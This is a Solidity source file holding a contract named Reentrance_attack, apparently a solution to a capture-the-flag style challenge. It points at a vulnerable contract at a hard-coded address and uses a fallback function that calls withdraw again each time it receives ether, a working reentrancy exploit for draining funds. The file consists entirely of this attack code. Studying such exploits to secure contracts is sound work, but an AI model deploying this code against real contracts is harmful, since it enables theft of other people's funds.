// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Reentrance_attack {
    Reentrancea public originalContract =
        Reentrancea(0x3B698C240B6Fcf741659684B4227E0813EC27934);

    function deposit(address donator) public payable {
        originalContract.donate{value: msg.value}(donator);
    }

    function withdraw(uint256 value) public {
        originalContract.withdraw(value);
    }

    fallback() external payable {
        originalContract.withdraw(msg.value);
    }
}
